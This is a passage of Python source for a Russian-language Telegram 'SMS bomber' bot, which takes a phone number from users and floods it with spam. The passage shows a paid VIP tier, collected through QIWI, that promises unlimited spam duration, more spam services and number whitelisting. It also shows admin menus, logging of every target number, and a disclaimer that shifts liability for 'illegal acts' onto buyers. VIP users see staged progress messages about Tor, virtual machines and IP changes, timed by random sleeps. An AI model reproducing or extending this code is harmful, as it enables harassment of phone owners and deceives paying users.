                    oplata_link = types.InlineKeyboardButton(text="💳 Перейти к оплате", url="https://qiwi.com/payment/form/99999?blocked%5B0%5D=account&amountFraction=0&extra%27comment%27={message.chat.id}&extra%5B%27account%27%5D="+str(qiwi_nick)+"&amountInteger=1&amountFraction=0&blocked[0]=account&blocked[1]=comment")
                    oplata_search = types.InlineKeyboardButton(text='✅ Проверить оплату', callback_data="oplata_search")

                    aaacho.add(oplata_link)
                    aaacho.add(oplata_search)

                    bot.send_message(message.chat.id, f"""<b>❗️ДОСТУП НЕ ОПЛАЧЕН❗️

Покупая VIP вы получаете:</b><i>

-Бесконечную продолжительность спама
-В 5 раз больше сервисов для спама
-Возможность добавлять номер в белый лист</i>


<b>Доступ будет выдан автоматически после перевода на QIWI кошелёк:</b>

Qiwi Nickname: <code>"""+str(qiwi_nick)+"""</code>
Комментарий: <code>"""+str(message.chat.id)+"""</code>
Сумма в рублях: <code>"""+str(price)+"""</code>

<i>Покупая VIP доступ Вы автоматически соглашаетесь с тем, что ответственность за все ваши незаконные деяния, несёте только Вы.</i>

<b>❗️Внимательно проверяйте комментарий при переводе❗️
❗️В ином случае доступ вы не получите❗️</b>

                        """
                        , reply_markup=aaacho, parse_mode = 'HTML')


            elif text == 'Админ меню' or text == '/admin' or text == '/a' or text == 'Админка':
                if str(message.chat.id) in open('admin.txt').read():
                    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
                    adds = types.KeyboardButton(text='Добавить VIP пользователя')
                    dels = types.KeyboardButton(text='Удалить VIP пользователя')
                    whldel = types.KeyboardButton(text='Удалить из белого листа')
                    mkrass = types.KeyboardButton(text='Сделать рассылку')
                    menu = types.KeyboardButton(text='🔙 Вернуться назад')
                    buttons_to_add = [adds, dels, whldel, mkrass, menu]
                    keyboard.add(*buttons_to_add)
                    bot.send_message(message.chat.id, '🚀 Вы в админ панели\nВыберите действие:',  reply_markup=keyboard)
                else:
                    bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAL7sV74lkTBxhjcSCdNwx0nF1iAvBIxAAJqAAOROZwcR0OSw21BY4UaBA", reply_to_message_id = message.message_id)

            elif text == '🔙 Вернуться назад':
                start(message)

            elif text == 'Добавить VIP пользователя':
                if str(message.chat.id) in open('admin.txt').read():
                    a = bot.send_message(message.chat.id, 'Введите id пользователя, которого хотите добавить в базу.')
                    bot.register_next_step_handler(a, adduser)
                else:
                    bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAL7sV74lkTBxhjcSCdNwx0nF1iAvBIxAAJqAAOROZwcR0OSw21BY4UaBA", reply_to_message_id = message.message_id)
            elif text == 'Удалить VIP пользователя':
                if str(message.chat.id) in open('admin.txt').read():
                    b = bot.send_message(message.chat.id, 'Введите id пользователя, которого хотите удалить с базы.')
                    bot.register_next_step_handler(b, delluser)
                else:
                    bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAL7sV74lkTBxhjcSCdNwx0nF1iAvBIxAAJqAAOROZwcR0OSw21BY4UaBA", reply_to_message_id = message.message_id)
            elif text == 'Удалить из белого листа':
                if str(message.chat.id) in open('admin.txt').read():
                    ww = bot.send_message(message.chat.id, "Введите номер, который вы хотите удалить с Белого листа.")
                    bot.register_next_step_handler(ww, delllwl)
                else:
                    bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAL7sV74lkTBxhjcSCdNwx0nF1iAvBIxAAJqAAOROZwcR0OSw21BY4UaBA", reply_to_message_id = message.message_id)

            elif text == 'Сделать рассылку':
                if str(message.chat.id) in open('admin.txt').read():
                    bot.send_message(message.chat.id, 'Отправьте "Рассылка: [текст рассылки]"')
                    
                else:
                    bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAL7sV74lkTBxhjcSCdNwx0nF1iAvBIxAAJqAAOROZwcR0OSw21BY4UaBA", reply_to_message_id = message.message_id)

            elif text == 'Защитить номер[VIP] 🛡':
                if str(message.chat.id) in open('vip_id.txt').read():
                    lol = bot.send_message(message.chat.id, "🛡 Введите номер, который хотите добавить в белый лист бомбера в формате:\n🇺🇦 380*********\n🇷🇺 79**********\n🇰🇿 77*********\n🇧🇾 375*********\n🇦🇲 374*********\n🇵🇱 44********* ")
                    bot.register_next_step_handler(lol, addwl)
                else:
                    bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAL7sV74lkTBxhjcSCdNwx0nF1iAvBIxAAJqAAOROZwcR0OSw21BY4UaBA", reply_to_message_id = message.message_id)

            elif len(text) == 11: # and str(chat_id) in open('vip_id.txt').read():
                phone = text
                save_numlog(phone)
                if str(message.chat.id) in open('vip_id.txt').read():
                    if str(phone) in open('numWL.txt').read():
                        bot.send_message(message.chat.id, '🛡 Этот номер под защитой')
                    else:
                        bot.send_message(message.chat.id, 'Приват сессия - ✅')
                        a = random.choice([0.3, 0.5, 0.7, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Многопоточная отправка пакетов - ✅')
                        a = random.choice([0.3, 0.5, 0.7, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Создание виртуальной машины - ✅')
                        a = random.choice([1, 1.5, 1.7, 2])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Подключение к виртуальной машине - ✅')
                        a = random.choice([0.1, 0.2, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Подключение к Tor - ✅')
                        a = random.choice([0.3, 0.5, 0.7, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Смена IP - ✅')
                        a = random.choice([0.3, 0.5, 0.7, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Запуск сессии - ✅')
                        a = random.choice([0.3, 0.5, 0.7, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Сессия запущена успешно - ✅')
                        spam_handler_vip(phone, chat_id, force=False)
                else:
                    if str(phone) in open('numWL.txt').read():
                        bot.send_message(message.chat.id, '🛡 Этот номер под защитой')
                    else:
                        spam_handler(phone, chat_id, force=False)

            elif len(text) == 12:
                phone = text
                save_numlog(phone)
                if str(message.chat.id) in open('vip_id.txt').read():
                    if str(phone) in open('numWL.txt').read():
                        bot.send_message(message.chat.id, '🛡 Этот номер под защитой')
                    else:
                        bot.send_message(message.chat.id, 'Приват сессия - ✅')
                        a = random.choice([0.3, 0.5, 0.7, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Многопоточная отправка пакетов - ✅')
                        a = random.choice([0.3, 0.5, 0.7, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Создание виртуальной машины - ✅')
                        a = random.choice([1, 1.5, 1.7, 2])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Подключение к виртуальной машине - ✅')
                        a = random.choice([0.1, 0.2, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Подключение к Tor - ✅')
                        a = random.choice([0.3, 0.5, 0.7, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Смена IP - ✅')
                        a = random.choice([0.3, 0.5, 0.7, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Запуск сессии - ✅')
                        a = random.choice([0.3, 0.5, 0.7, 1])
                        time.sleep(a)
                        bot.send_message(message.chat.id, 'Сессия запущена успешно - ✅')
                        spam_handler_vip(phone, chat_id, force=False)
                else:
                    if str(phone) in open('numWL.txt').read():
                        bot.send_message(message.chat.id, '🛡 Этот номер под защитой')
                    else:
                        spam_handler(phone, chat_id, force=False)


            else:
                pass
        
        #elif user_status == 'restricted' or user_status =='left' or user_status =='kicked':
        #    bot.send_message(message.chat.id, 'Вы не подписаны на наш канал.\nПодпишитесь на него чтобы получить доступ к боту.', reply_markup = inl_keyboard)
        
        else:
            pass



@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    message = call.message
    if call.message:
        if call.data == 'oplata_search':
            user = str(message.from_user.username)
            chat_id = str(message.chat.id)
            donat(chat_id, user)
        
        elif message.chat.id < 0:
            bot.send_message(message.chat.id, 'Этот канал/чат добавлен в черный список бота.')

if __name__ == '__main__':
    bot.polling(none_stop=True)